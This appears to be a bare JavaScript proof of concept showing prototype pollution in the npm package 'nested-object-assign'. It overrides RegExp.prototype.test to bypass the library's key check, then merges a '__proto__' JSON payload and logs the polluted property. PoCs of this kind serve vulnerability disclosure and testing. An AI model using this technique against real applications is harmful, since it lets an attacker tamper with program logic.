RegExp.prototype.test = () => false;
const assign = require('nested-object-assign');
console.log({}.polluted);
assign({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);